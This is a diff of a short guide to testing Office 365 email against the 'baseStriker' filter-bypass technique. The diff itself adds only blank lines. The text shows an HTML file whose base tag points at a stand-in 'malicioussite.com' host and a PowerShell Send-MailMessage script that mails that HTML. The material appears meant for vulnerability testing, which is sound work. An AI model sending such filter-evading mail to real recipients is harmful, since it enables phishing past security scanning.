@@ -3,6 +3,7 @@ As of 2018-05-14, Microsoft Office 365 email is vulnerable to the baseStriker at
 Create the following files in the same folder and run the baseStriker_test.ps1 PowerShell script.
 
 baseStriker_Test.htm
+
  <html>
  <head>
       <base href="https://www.malicioussite.com/">
@@ -14,5 +15,6 @@ baseStriker_Test.htm
  </html>
 
 baseStriker_test.ps1
+
  [String]$body = gc "baseStriker_Test.htm" 
  Send-MailMessage -SmtpServer <smtp_server> -From <from_address> -To <to_address> -Subject "baseStriker Test" -Body $body 
